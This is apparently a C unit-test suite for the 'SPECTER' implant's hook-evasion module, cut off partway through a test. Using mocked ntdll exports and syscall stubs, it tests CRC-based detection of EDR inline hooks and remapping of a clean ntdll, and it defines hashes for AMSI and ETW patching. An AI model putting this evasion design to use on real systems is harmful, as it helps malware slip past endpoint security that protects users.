/**
 * SPECTER Implant — Hook Evasion & Integrity Monitoring Test Suite
 *
 * Tests evasion_compute_crc, evasion_init_crc_table, evasion_check_hooks,
 * and evasion_refresh_ntdll with mock module resolution, syscall table,
 * and memory management stubs.
 *
 * Build (native, not PIC):
 *   gcc -o test_hooks test_hooks.c \
 *       ../core/src/evasion/hooks.c \
 *       -I../core/include -DTEST_BUILD
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ------------------------------------------------------------------ */
/* Type stubs (no windows.h)                                           */
/* ------------------------------------------------------------------ */

typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned short      USHORT;
typedef unsigned int        DWORD;
typedef unsigned long long  QWORD;
typedef unsigned long long  ULONG_PTR;
typedef unsigned long long  SIZE_T;
typedef long                LONG;
typedef long                NTSTATUS;
typedef int                 BOOL;
typedef unsigned int        ULONG;
typedef short               SHORT;
typedef unsigned short      WCHAR;
typedef char                CHAR;
typedef unsigned char       UCHAR;
typedef void                VOID;
typedef void*               PVOID;
typedef void*               HANDLE;
typedef BYTE*               PBYTE;
typedef DWORD*              PDWORD;
typedef ULONG*              PULONG;
typedef SIZE_T*             PSIZE_T;
typedef WCHAR*              PWCHAR;
typedef const char*         PCSTR;
typedef const WCHAR*        PCWSTR;
typedef LONG*               PLONG;
typedef void**              PHANDLE;

#define TRUE  1
#define FALSE 0
#ifndef NULL
#define NULL ((void*)0)
#endif
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS              ((NTSTATUS)0x00000000)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001)
#define STATUS_INVALID_PARAMETER    ((NTSTATUS)0xC000000D)
#define STATUS_PROCEDURE_NOT_FOUND  ((NTSTATUS)0xC000007A)
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034)
#define STATUS_ACCESS_DENIED        ((NTSTATUS)0xC0000022)
#define STATUS_NO_MEMORY            ((NTSTATUS)0xC0000017)
#define INVALID_HANDLE_VALUE ((HANDLE)(ULONG_PTR)-1)

#define PAGE_NOACCESS           0x01
#define PAGE_READONLY           0x02
#define PAGE_READWRITE          0x04
#define PAGE_EXECUTE            0x10
#define PAGE_EXECUTE_READ       0x20
#define PAGE_EXECUTE_READWRITE  0x40
#define PAGE_GUARD              0x100

#define MEM_COMMIT              0x00001000
#define MEM_RESERVE             0x00002000
#define MEM_RELEASE             0x00008000

#define SECTION_MAP_READ    0x0004
#define SECTION_MAP_EXECUTE 0x0008

#define OBJ_CASE_INSENSITIVE 0x00000040

/* Stub PE/NT structures */
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWCHAR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink, *Blink; } LIST_ENTRY, *PLIST_ENTRY;
typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; LIST_ENTRY HashLinks; ULONG TimeDateStamp; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
typedef struct _PEB_LDR_DATA { ULONG Length; BOOL Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;
typedef struct _PEB { BYTE InheritedAddressSpace; BYTE ReadImageFileExecOptions; BYTE BeingDebugged; BYTE BitField; BYTE Padding0[4]; PVOID Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr; } PEB, *PPEB;
typedef struct _IMAGE_DOS_HEADER { WORD e_magic; WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER;
typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY;
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
#define IMAGE_DIRECTORY_ENTRY_EXPORT 0
typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; QWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; QWORD SizeOfStackReserve; QWORD SizeOfStackCommit; QWORD SizeOfHeapReserve; QWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64;
typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;
typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY;
typedef struct _IMAGE_SECTION_HEADER { BYTE Name[8]; DWORD VirtualSize; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER;

typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, *PCLIENT_ID;
typedef union _LARGE_INTEGER { struct { DWORD LowPart; LONG HighPart; }; long long QuadPart; } LARGE_INTEGER, *PLARGE_INTEGER;
typedef struct _MEMORY_BASIC_INFORMATION { PVOID BaseAddress; PVOID AllocationBase; DWORD AllocationProtect; WORD PartitionId; WORD Padding; SIZE_T RegionSize; DWORD State; DWORD Protect; DWORD Type; } MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
typedef enum _PROCESSINFOCLASS { ProcessBasicInformation = 0, ProcessDebugPort = 7, ProcessWow64Information = 26, ProcessImageFileName = 27, ProcessBreakOnTermination = 29 } PROCESSINFOCLASS;
typedef enum _SECTION_INHERIT { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT;

#define InitializeObjectAttributes(p, n, a, r, s) \
    do { \
        (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
        (p)->RootDirectory = (r); \
        (p)->ObjectName = (n); \
        (p)->Attributes = (a); \
        (p)->SecurityDescriptor = (s); \
        (p)->SecurityQualityOfService = NULL; \
    } while(0)

/* ------------------------------------------------------------------ */
/* Syscall table types                                                  */
/* ------------------------------------------------------------------ */

#define SYSCALL_TABLE_CAPACITY 50

typedef struct _SYSCALL_ENTRY {
    DWORD ssn;
    PVOID syscall_addr;
    DWORD hash;
} SYSCALL_ENTRY;

typedef struct _SYSCALL_TABLE {
    SYSCALL_ENTRY entries[SYSCALL_TABLE_CAPACITY];
    DWORD         count;
    PVOID         clean_ntdll;
} SYSCALL_TABLE;

typedef struct _IMPLANT_CONTEXT {
    SYSCALL_TABLE *syscall_table;
    PVOID          clean_ntdll;
    PVOID          config;
    PVOID          comms_ctx;
    PVOID          sleep_ctx;
    PVOID          evasion_ctx;
    PVOID          module_bus;
    BOOL           running;
} IMPLANT_CONTEXT;

IMPLANT_CONTEXT g_ctx;

/* Global syscall table (referenced by hooks.c) */
SYSCALL_TABLE g_syscall_table;

/* ------------------------------------------------------------------ */
/* Evasion types (inline, matching evasion.h)                          */
/* ------------------------------------------------------------------ */

#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3

typedef struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;
    DWORD EndAddress;
    DWORD UnwindInfoAddress;
} RUNTIME_FUNCTION, *PRUNTIME_FUNCTION;

#define HASH_NTDLL_DLL      0x22D3B5ED
#define HASH_KERNEL32_DLL   0x7040EE75
#define HASH_USER32_DLL     0x5E5AB823
#define HASH_RPCRT4_DLL     0xBB09A486
#define HASH_COMBASE_DLL    0xBC8E54C5
#define HASH_RTLUSERTHREADSTART     0xA2E74681
#define HASH_BASETHREADINITTHUNK    0xD83D6AA1
#define HASH_ETWEVENTWRITE          0x941F3482
#define HASH_ETWEVENTWRITEEX        0x18BE6A7F
#define HASH_AMSISCANBUFFER         0x5DFB3DEE
#define HASH_AMSI_DLL               0xDAF90FD9

#define ETW_PATCH_SIZE  3
#define AMSI_PATCH_SIZE 6

#define FRAME_MAX_ENTRIES   256
#define FRAME_CHAIN_MAX     8
#define SAVED_FRAMES_MAX    16

typedef struct _FRAME_ENTRY {
    PVOID  code_start;
    PVOID  code_end;
    PVOID  unwind_info;
    DWORD  module_hash;
} FRAME_ENTRY;

typedef struct _FRAME_LIBRARY {
    FRAME_ENTRY entries[FRAME_MAX_ENTRIES];
    DWORD       count;
    DWORD       max_capacity;
} FRAME_LIBRARY;

typedef struct _SAVED_STACK_FRAMES {
    QWORD  original_rsp;
    QWORD  saved_return_addrs[SAVED_FRAMES_MAX];
    QWORD  saved_rbp_chain[SAVED_FRAMES_MAX];
    DWORD  frame_count;
} SAVED_STACK_FRAMES;

#define CRC_TABLE_CAPACITY  64
#define CRC_CHECK_BYTES     32

typedef struct _CRC_ENTRY {
    DWORD func_hash;
    DWORD crc_value;
    PVOID func_addr;
} CRC_ENTRY;

typedef struct _CRC_TABLE {
    CRC_ENTRY entries[CRC_TABLE_CAPACITY];
    DWORD     count;
} CRC_TABLE;

typedef struct _EVASION_CONTEXT {
    FRAME_LIBRARY  frame_lib;
    PVOID          clean_ntdll;
    CRC_TABLE      crc_table;
    BOOL           etw_patched;
    BOOL           amsi_patched;
    BYTE           etw_original[8];
    BYTE           amsi_original[8];
    PVOID          etw_patch_addr;
    PVOID          amsi_patch_addr;
    DWORD          prng_state;
} EVASION_CONTEXT;

/* ------------------------------------------------------------------ */
/* String/memory stubs using libc                                      */
/* ------------------------------------------------------------------ */

SIZE_T spec_strlen(const char *s) { return strlen(s); }
SIZE_T spec_wcslen(const WCHAR *s) { SIZE_T n=0; while(s[n]) n++; return n; }
int spec_strcmp(const char *a, const char *b) { return strcmp(a,b); }
int spec_wcsicmp(const WCHAR *a, const WCHAR *b) { (void)a; (void)b; return 0; }
void *spec_memcpy(void *d, const void *s, SIZE_T n) { return memcpy(d,s,n); }
void *spec_memmove(void *d, const void *s, SIZE_T n) { return memmove(d,s,n); }
void *spec_memset(void *d, int c, SIZE_T n) { return memset(d,c,n); }
int spec_memcmp(const void *a, const void *b, SIZE_T n) { return memcmp(a,b,n); }
char *spec_strcpy(char *d, const char *s) { return strcpy(d,s); }
char *spec_strcat(char *d, const char *s) { return strcat(d,s); }
DWORD spec_djb2_hash(const char *str) { DWORD h=5381; int c; while((c=*str++)){if(c>='A'&&c<='Z')c+=0x20;h=((h<<5)+h)+c;} return h; }
DWORD spec_djb2_hash_w(const WCHAR *str) { (void)str; return 0; }
PPEB get_peb(void) { return NULL; }

/* ------------------------------------------------------------------ */
/* Mock function buffers — simulating ntdll function prologues          */
/* ------------------------------------------------------------------ */

/* Fake "clean" ntdll function stubs — CRC baselines come from these */
#define FAKE_FUNC_COUNT 3
#define FAKE_FUNC_SIZE  64

static BYTE fake_clean_funcs[FAKE_FUNC_COUNT][FAKE_FUNC_SIZE];
static BYTE fake_live_funcs[FAKE_FUNC_COUNT][FAKE_FUNC_SIZE];

/* Fake hash values for test functions */
#define TEST_HASH_FUNC_A  0x11111111
#define TEST_HASH_FUNC_B  0x22222222
#define TEST_HASH_FUNC_C  0x33333333

static DWORD test_func_hashes[FAKE_FUNC_COUNT] = {
    TEST_HASH_FUNC_A,
    TEST_HASH_FUNC_B,
    TEST_HASH_FUNC_C,
};

/* ------------------------------------------------------------------ */
/* Mock control flags                                                   */
/* ------------------------------------------------------------------ */

static PVOID mock_clean_ntdll_base = NULL;
static PVOID mock_live_ntdll_base  = NULL;
static BOOL  mock_ntdll_available  = TRUE;
static BOOL  mock_open_section_fail = FALSE;
static BOOL  mock_map_view_fail    = FALSE;

/* Track syscall wrapper calls */
static int open_section_call_count = 0;
static int map_view_call_count     = 0;
static int unmap_view_call_count   = 0;
static int close_call_count        = 0;

/* New clean ntdll base after refresh */
static PVOID mock_refresh_ntdll_base = NULL;
static BYTE  fake_refresh_funcs[FAKE_FUNC_COUNT][FAKE_FUNC_SIZE];

/* ------------------------------------------------------------------ */
/* Mock module/export resolution                                       */
/* ------------------------------------------------------------------ */

/**
 * When hash == HASH_NTDLL_DLL, return the live ntdll base (for
 * evasion_check_hooks comparing in-memory functions).
 */
PVOID find_module_by_hash(DWORD h) {
    if (h == HASH_NTDLL_DLL && mock_ntdll_available)
        return mock_live_ntdll_base;
    return NULL;
}

/**
 * Export resolution: maps function hash to fake buffer addresses.
 * When module_base == clean_ntdll, returns clean func addresses.
 * When module_base == live_ntdll, returns live func addresses.
 * When module_base == refresh_ntdll, returns refresh func addresses.
 */
PVOID find_export_by_hash(PVOID module_base, DWORD h) {
    BYTE (*funcs)[FAKE_FUNC_SIZE] = NULL;

    if (module_base == mock_clean_ntdll_base)
        funcs = fake_clean_funcs;
    else if (module_base == mock_live_ntdll_base)
        funcs = fake_live_funcs;
    else if (module_base == mock_refresh_ntdll_base)
        funcs = fake_refresh_funcs;
    else
        return NULL;

    for (int i = 0; i < FAKE_FUNC_COUNT; i++) {
        if (h == test_func_hashes[i])
            return &funcs[i][0];
    }
    return NULL;
}

PVOID resolve_function(DWORD mh, DWORD fh) {
    PVOID mod = find_module_by_hash(mh);
    if (!mod) return NULL;
    return find_export_by_hash(mod, fh);
}

/* ------------------------------------------------------------------ */
/* Mock syscall wrappers                                               */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtOpenSection(PHANDLE section, ULONG access,
    POBJECT_ATTRIBUTES oa) {
    (void)access; (void)oa;
    open_section_call_count++;
    if (mock_open_section_fail)
        return STATUS_ACCESS_DENIED;
    if (section)
        *section = (HANDLE)(ULONG_PTR)0xDEAD;
    return STATUS_SUCCESS;
}

NTSTATUS spec_NtMapViewOfSection(HANDLE section, HANDLE process,
    PVOID *base, ULONG_PTR zero_bits, SIZE_T commit_size,
    PLARGE_INTEGER offset, PSIZE_T view_size,
    SECTION_INHERIT inherit, ULONG alloc_type, ULONG protect) {
    (void)section; (void)process; (void)zero_bits; (void)commit_size;
    (void)offset; (void)view_size; (void)inherit; (void)alloc_type; (void)protect;
    map_view_call_count++;
    if (mock_map_view_fail)
        return STATUS_NO_MEMORY;
    if (base)
        *base = mock_refresh_ntdll_base;
    return STATUS_SUCCESS;
}

NTSTATUS spec_NtUnmapViewOfSection(HANDLE process, PVOID base) {
    (void)process; (void)base;
    unmap_view_call_count++;
    return STATUS_SUCCESS;
}

NTSTATUS spec_NtClose(HANDLE handle) {
    (void)handle;
    close_call_count++;
    return STATUS_SUCCESS;
}

NTSTATUS spec_NtProtectVirtualMemory(HANDLE process, PVOID *base,
    PSIZE_T size, ULONG new_protect, PULONG old_protect) {
    (void)process; (void)base; (void)size; (void)new_protect;
    if (old_protect) *old_protect = PAGE_EXECUTE_READ;
    return STATUS_SUCCESS;
}

/* Mock sc_find_gadget — returns a fake gadget address */
static PVOID mock_gadget_addr = (PVOID)(ULONG_PTR)0xCAFE;
static BOOL  mock_gadget_fail = FALSE;

PVOID sc_find_gadget(PVOID clean_ntdll) {
    (void)clean_ntdll;
    if (mock_gadget_fail) return NULL;
    return mock_gadget_addr;
}

/* Mock sc_resolve_ssn — returns SSN based on hash */
static BOOL mock_ssn_fail = FALSE;

DWORD sc_resolve_ssn(PVOID clean_ntdll, DWORD func_hash) {
    (void)clean_ntdll;
    if (mock_ssn_fail) return (DWORD)-1;
    /* Return a deterministic SSN based on hash */
    return func_hash & 0xFF;
}

/* ------------------------------------------------------------------ */
/* Declarations from hooks.c                                           */
/* ------------------------------------------------------------------ */

DWORD evasion_compute_crc(PVOID func_addr, DWORD len);
NTSTATUS evasion_init_crc_table(EVASION_CONTEXT *ctx);
BOOL evasion_check_hooks(EVASION_CONTEXT *ctx);
NTSTATUS evasion_refresh_ntdll(EVASION_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/* Test framework                                                      */
/* ------------------------------------------------------------------ */

static int tests_run = 0;
static int tests_passed = 0;

#define ASSERT(cond, msg) do { \
    tests_run++; \
    if (!(cond)) { \
        printf("  FAIL: %s (line %d)\n", msg, __LINE__); \
    } else { \
        tests_passed++; \
    } \
} while(0)

/* ------------------------------------------------------------------ */
/* Helper: reset all test state                                        */
/* ------------------------------------------------------------------ */

static void reset_state(void) {
    /* Fill fake function stubs with known patterns */
    for (int i = 0; i < FAKE_FUNC_COUNT; i++) {
        /* Clean and live start identical (no hooks) */
        memset(fake_clean_funcs[i], 0x4C + i, FAKE_FUNC_SIZE);
        memset(fake_live_funcs[i], 0x4C + i, FAKE_FUNC_SIZE);
        memset(fake_refresh_funcs[i], 0x4C + i, FAKE_FUNC_SIZE);
    }

    mock_clean_ntdll_base = (PVOID)(ULONG_PTR)0x10000000;
    mock_live_ntdll_base  = (PVOID)(ULONG_PTR)0x7FFE0000;
    mock_refresh_ntdll_base = (PVOID)(ULONG_PTR)0x20000000;
    mock_ntdll_available = TRUE;
    mock_open_section_fail = FALSE;
    mock_map_view_fail = FALSE;
    mock_gadget_fail = FALSE;
    mock_ssn_fail = FALSE;

    open_section_call_count = 0;
    map_view_call_count = 0;
    unmap_view_call_count = 0;
    close_call_count = 0;

    /* Set up the syscall table with test entries */
    memset(&g_syscall_table, 0, sizeof(SYSCALL_TABLE));
    g_syscall_table.clean_ntdll = mock_clean_ntdll_base;
    for (int i = 0; i < FAKE_FUNC_COUNT; i++) {
        g_syscall_table.entries[i].hash = test_func_hashes[i];
        g_syscall_table.entries[i].ssn  = (DWORD)(0x10 + i);
        g_syscall_table.entries[i].syscall_addr = mock_gadget_addr;
    }
    g_syscall_table.count = FAKE_FUNC_COUNT;
}

/* ================================================================== */
/*  CRC32 Computation Tests                                            */
/* ================================================================== */

static void test_compute_crc_null(void) {
    printf("[test_compute_crc_null]\n");
    ASSERT(evasion_compute_crc(NULL, 32) == 0, "NULL addr returns 0");
    printf("  Passed.\n");
}

static void test_compute_crc_zero_len(void) {
    printf("[test_compute_crc_zero_len]\n");
    BYTE data[4] = { 0x01, 0x02, 0x03, 0x04 };
    ASSERT(evasion_compute_crc(data, 0) == 0, "zero len returns 0");
    printf("  Passed.\n");
}

static void test_compute_crc_deterministic(void) {
    printf("[test_compute_crc_deterministic]\n");
    BYTE data[8] = { 0x4C, 0x8B, 0xD1, 0xB8, 0x12, 0x00, 0x00, 0x00 };
    DWORD crc1 = evasion_compute_crc(data, 8);
    DWORD crc2 = evasion_compute_crc(data, 8);
    ASSERT(crc1 == crc2, "same input produces same CRC");
    ASSERT(crc1 != 0, "CRC is non-zero for non-zero input");
    printf("  Passed.\n");
}

static void test_compute_crc_different_data(void) {
    printf("[test_compute_crc_different_data]\n");
    BYTE data_a[8] = { 0x4C, 0x8B, 0xD1, 0xB8, 0x12, 0x00, 0x00, 0x00 };
    BYTE data_b[8] = { 0x4C, 0x8B, 0xD1, 0xB8, 0x13, 0x00, 0x00, 0x00 };
    DWORD crc_a = evasion_compute_crc(data_a, 8);
    DWORD crc_b = evasion_compute_crc(data_b, 8);
    ASSERT(crc_a != crc_b, "different data produces different CRC");
    printf("  Passed.\n");
}

static void test_compute_crc_single_byte(void) {
    printf("[test_compute_crc_single_byte]\n");
    BYTE data = 0x00;
    DWORD crc = evasion_compute_crc(&data, 1);
    /* CRC32 of single zero byte is well-known: 0xD202EF8D */
    ASSERT(crc == 0xD202EF8D, "CRC32 of 0x00 matches known value");
    printf("  Passed.\n");
}

static void test_compute_crc_known_value(void) {
    printf("[test_compute_crc_known_value]\n");
    /* CRC32 of "123456789" = 0xCBF43926 */
    BYTE data[] = "123456789";
    DWORD crc = evasion_compute_crc(data, 9);
    ASSERT(crc == 0xCBF43926, "CRC32 of '123456789' matches IEEE standard");
    printf("  Passed.\n");
}

static void test_compute_crc_sensitivity(void) {
    printf("[test_compute_crc_sensitivity]\n");
    /* Changing a single bit should change the CRC */
    BYTE data[32];
    memset(data, 0xCC, 32);
    DWORD crc_orig = evasion_compute_crc(data, 32);

    data[0] = 0xCD;  /* Flip one bit in first byte */
    DWORD crc_mod = evasion_compute_crc(data, 32);
    ASSERT(crc_orig != crc_mod, "single-bit change detected by CRC");
    printf("  Passed.\n");
}

/* ================================================================== */
/*  CRC Table Initialization Tests                                     */
/* ================================================================== */

static void test_init_crc_table_null_ctx(void) {
    printf("[test_init_crc_table_null_ctx]\n");
    NTSTATUS status = evasion_init_crc_table(NULL);
    ASSERT(status == STATUS_INVALID_PARAMETER, "NULL ctx returns invalid param");
    printf("  Passed.\n");
}

static void test_init_crc_table_no_clean_ntdll(void) {
    printf("[test_init_crc_table_no_clean_ntdll]\n");
    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = NULL;
    NTSTATUS status = evasion_init_crc_table(&ctx);
    ASSERT(status == STATUS_UNSUCCESSFUL, "fails without clean_ntdll");
    printf("  Passed.\n");
}

static void test_init_crc_table_success(void) {
    printf("[test_init_crc_table_success]\n");
    reset_state();

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    NTSTATUS status = evasion_init_crc_table(&ctx);
    ASSERT(NT_SUCCESS(status), "init_crc_table succeeds");
    ASSERT(ctx.crc_table.count == FAKE_FUNC_COUNT,
           "all functions added to CRC table");

    /* Verify CRC values match clean function data */
    for (DWORD i = 0; i < ctx.crc_table.count; i++) {
        DWORD expected_crc = evasion_compute_crc(
            fake_clean_funcs[i], CRC_CHECK_BYTES);
        ASSERT(ctx.crc_table.entries[i].crc_value == expected_crc,
               "CRC baseline matches clean function");
        ASSERT(ctx.crc_table.entries[i].func_hash == test_func_hashes[i],
               "function hash stored correctly");
    }

    printf("  Passed.\n");
}

static void test_init_crc_table_empty_syscall_table(void) {
    printf("[test_init_crc_table_empty_syscall_table]\n");
    reset_state();
    g_syscall_table.count = 0;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    NTSTATUS status = evasion_init_crc_table(&ctx);
    ASSERT(status == STATUS_UNSUCCESSFUL, "fails with empty syscall table");
    ASSERT(ctx.crc_table.count == 0, "no entries added");

    printf("  Passed.\n");
}

/* ================================================================== */
/*  Hook Detection Tests                                               */
/* ================================================================== */

static void test_check_hooks_null_ctx(void) {
    printf("[test_check_hooks_null_ctx]\n");
    ASSERT(evasion_check_hooks(NULL) == FALSE, "NULL ctx returns FALSE");
    printf("  Passed.\n");
}

static void test_check_hooks_empty_crc_table(void) {
    printf("[test_check_hooks_empty_crc_table]\n");
    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ASSERT(evasion_check_hooks(&ctx) == FALSE, "empty CRC table returns FALSE");
    printf("  Passed.\n");
}

static void test_check_hooks_no_hooks(void) {
    printf("[test_check_hooks_no_hooks]\n");
    reset_state();

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    /* Build baselines */
    evasion_init_crc_table(&ctx);

    /* Live and clean are identical — no hooks */
    BOOL detected = evasion_check_hooks(&ctx);
    ASSERT(detected == FALSE, "no hooks detected when clean");
    ASSERT(open_section_call_count == 0, "no re-map attempted");

    printf("  Passed.\n");
}

static void test_check_hooks_hook_detected(void) {
    printf("[test_check_hooks_hook_detected]\n");
    reset_state();

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    evasion_init_crc_table(&ctx);

    /* Simulate EDR hooking function B (jmp to detour) */
    fake_live_funcs[1][0] = 0xE9;  /* JMP rel32 */
    fake_live_funcs[1][1] = 0x00;
    fake_live_funcs[1][2] = 0x10;
    fake_live_funcs[1][3] = 0x00;
    fake_live_funcs[1][4] = 0x00;

    BOOL detected = evasion_check_hooks(&ctx);
    ASSERT(detected == TRUE, "hook detected after modification");

    /* Verify remediation occurred: ntdll was re-mapped */
    ASSERT(open_section_call_count > 0, "NtOpenSection called for re-map");
    ASSERT(map_view_call_count > 0, "NtMapViewOfSection called for re-map");

    printf("  Passed.\n");
}

static void test_check_hooks_all_funcs_hooked(void) {
    printf("[test_check_hooks_all_funcs_hooked]\n");
    reset_state();

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    evasion_init_crc_table(&ctx);

    /* Hook all functions */
    for (int i = 0; i < FAKE_FUNC_COUNT; i++) {
        fake_live_funcs[i][0] = 0xE9;
        fake_live_funcs[i][1] = 0xFF;
    }

    BOOL detected = evasion_check_hooks(&ctx);
    ASSERT(detected == TRUE, "hooks detected when all modified");

    printf("  Passed.\n");
}

static void test_check_hooks_ntdll_not_found(void) {
    printf("[test_check_hooks_ntdll_not_found]\n");
    reset_state();

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;
    evasion_init_crc_table(&ctx);

    /* Make live ntdll unavailable */
    mock_ntdll_available = FALSE;

    BOOL detected = evasion_check_hooks(&ctx);
    ASSERT(detected == FALSE, "returns FALSE when ntdll not found");

    printf("  Passed.\n");
}

static void test_check_hooks_recomputes_baselines(void) {
    printf("[test_check_hooks_recomputes_baselines]\n");
    reset_state();

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;
    evasion_init_crc_table(&ctx);

    /* Record original CRC for func A */
    DWORD orig_crc = ctx.crc_table.entries[0].crc_value;

    /* Modify live func to trigger hook detection */
    fake_live_funcs[0][0] = 0xE9;

    /* Set up refresh funcs with slightly different content */
    memset(fake_refresh_funcs[0], 0xAA, FAKE_FUNC_SIZE);
    memset(fake_refresh_funcs[1], 0xBB, FAKE_FUNC_SIZE);
    memset(fake_refresh_funcs[2], 0xCC, FAKE_FUNC_SIZE);

    /* After refresh, clean_ntdll will point to refresh base,
       so CRC baselines should be recomputed from refresh funcs */
    evasion_check_hooks(&ctx);

    /* CRC table should have been recomputed from refresh funcs */
    DWORD new_crc = ctx.crc_table.entries[0].crc_value;
    DWORD expected_crc = evasion_compute_crc(fake_refresh_funcs[0], CRC_CHECK_BYTES);
    ASSERT(new_crc == expected_crc, "CRC recomputed from fresh mapping");
    ASSERT(new_crc != orig_crc, "CRC changed after re-map");

    printf("  Passed.\n");
}

/* ================================================================== */
/*  Refresh ntdll Tests                                                */
/* ================================================================== */

static void test_refresh_ntdll_null_ctx(void) {
    printf("[test_refresh_ntdll_null_ctx]\n");
    NTSTATUS status = evasion_refresh_ntdll(NULL);
    ASSERT(status == STATUS_INVALID_PARAMETER, "NULL ctx returns invalid param");
    printf("  Passed.\n");
}

static void test_refresh_ntdll_success(void) {
    printf("[test_refresh_ntdll_success]\n");
    reset_state();

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    NTSTATUS status = evasion_refresh_ntdll(&ctx);
    ASSERT(NT_SUCCESS(status), "refresh succeeds");
    ASSERT(ctx.clean_ntdll == mock_refresh_ntdll_base, "clean_ntdll updated");
    ASSERT(g_syscall_table.clean_ntdll == mock_refresh_ntdll_base,
           "syscall table clean_ntdll updated");
    ASSERT(unmap_view_call_count == 1, "old mapping unmapped");
    ASSERT(open_section_call_count == 1, "section opened");
    ASSERT(map_view_call_count == 1, "new view mapped");
    ASSERT(close_call_count == 1, "section handle closed");

    printf("  Passed.\n");
}

static void test_refresh_ntdll_open_fail(void) {
    printf("[test_refresh_ntdll_open_fail]\n");
    reset_state();
    mock_open_section_fail = TRUE;

